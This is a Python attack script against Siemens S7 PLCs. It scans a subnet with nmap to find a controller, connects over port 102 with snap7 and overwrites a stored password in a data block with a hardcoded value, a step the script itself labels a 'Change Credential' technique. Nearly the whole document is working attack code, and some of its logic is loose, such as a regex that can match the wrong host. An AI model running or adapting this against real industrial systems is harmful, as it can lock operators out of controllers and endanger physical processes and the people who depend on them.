import snap7
import subprocess
import re
import socket

# Configuration (Adjust these to your environment)
PLC_IP_DEFAULT = "192.168.0.1"  # Default IP if auto-discovery fails
RACK = 0
SLOT = 1
NEW_PASSWORD = "NewStrongPassword123!"  # VERY IMPORTANT:  USE A STRONG, COMPLEX PASSWORD!
PASSWORD_DB_NUMBER = 10 # Data Block to store the PLC password. Change if needed.
PASSWORD_DB_OFFSET = 0   # Offset within the DB where the password is stored
PASSWORD_LENGTH = 32     # Expected maximum password length.  Adjust as needed.  PLC side must also handle this.

def find_plc_ip():
    """
    Attempts to discover the PLC's IP address using nmap.  This requires nmap to be installed
    and in the system's PATH.  If nmap is not available, or if discovery fails, it returns the
    PLC_IP_DEFAULT.

    Returns:
        str: The IP address of the PLC, or the default IP if discovery fails.
    """
    try:
        # Run nmap to discover devices on the network
        result = subprocess.run(['nmap', '-sn', '192.168.0.0/24'], capture_output=True, text=True, timeout=30)  # Adjust network range if needed
        output = result.stdout

        # Regex to find IP addresses with "Siemens" or "SIMATIC" in the nmap output
        match = re.search(r'Nmap scan report for (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}).*Siemens|Nmap scan report for (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}).*SIMATIC', output, re.DOTALL)

        if match:
            # Find the IP address. If the first group exist return the IP address, otherwise the second.
            plc_ip = match.group(1) if match.group(1) else match.group(2)
            print(f"PLC IP address found: {plc_ip}")
            return plc_ip
        else:
            print("PLC IP address not found using nmap.  Using default IP.")
            return PLC_IP_DEFAULT
    except FileNotFoundError:
        print("nmap not found.  Please install nmap and ensure it's in your PATH. Using default IP.")
        return PLC_IP_DEFAULT
    except subprocess.TimeoutExpired:
        print("nmap scan timed out. Using default IP.")
        return PLC_IP_DEFAULT
    except Exception as e:
        print(f"An error occurred during IP discovery: {e}. Using default IP.")
        return PLC_IP_DEFAULT

def check_plc_connection(ip_address):
     """
     Checks if the PLC is reachable at the given IP address.

     Args:
         ip_address (str): The IP address to check.

     Returns:
         bool: True if the PLC is reachable, False otherwise.
     """
     try:
         socket.create_connection((ip_address, 102), timeout=5)  # Port 102 is the S7 port
         return True
     except (socket.timeout, socket.error) as e:
         print(f"PLC not reachable at {ip_address}: {e}")
         return False

def change_plc_password(plc_ip, rack, slot, new_password, db_number, db_offset, password_length):
    """
    Changes the password stored in a data block on the Siemens S7-1200 PLC.

    Args:
        plc_ip (str): The IP address of the PLC.
        rack (int): The PLC rack number.
        slot (int): The PLC slot number.
        new_password (str): The new password to set.
        db_number (int): The data block number where the password is stored.
        db_offset (int): The offset within the data block where the password is stored.
        password_length (int): The maximum length of the password (including null terminator).
    """
    try:
        # Create a Snap7 client
        plc = snap7.client.Client()

        # Connect to the PLC
        plc.connect(plc_ip, rack, slot)
        print(f"Connected to PLC at {plc_ip}, Rack: {rack}, Slot: {slot}")

        # Read the existing password data block to get the current password length
        db_data = plc.db_read(db_number, db_offset, password_length)

        # Convert the new password to bytes, padding with null bytes if necessary
        password_bytes = new_password.encode('ascii')  # Assuming ASCII encoding (most common for PLC passwords)
        if len(password_bytes) > password_length - 1:
            print("Error: Password too long. Please shorten the password.")
            plc.disconnect()
            return

        padded_password = password_bytes + b'\x00' * (password_length - len(password_bytes)) # Null terminate and pad

        # Write the new password to the data block
        plc.db_write(db_number, db_offset, padded_password)
        print(f"Password successfully written to DB{db_number}.DBB{db_offset}")

        # Disconnect from the PLC
        plc.disconnect()
        print("Disconnected from PLC.")

    except snap7.exceptions.Snap7Exception as e:
        print(f"Error communicating with the PLC: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")


if __name__ == "__main__":
    # 1. Discover the PLC IP address
    plc_ip_address = find_plc_ip()

    # 2. Verify PLC Reachability
    if not check_plc_connection(plc_ip_address):
        print("PLC is not reachable. Exiting.")
        exit()

    # 3. Implement the "Change Credential" technique
    change_plc_password(plc_ip_address, RACK, SLOT, NEW_PASSWORD, PASSWORD_DB_NUMBER, PASSWORD_DB_OFFSET, PASSWORD_LENGTH)

    print("Script execution complete.")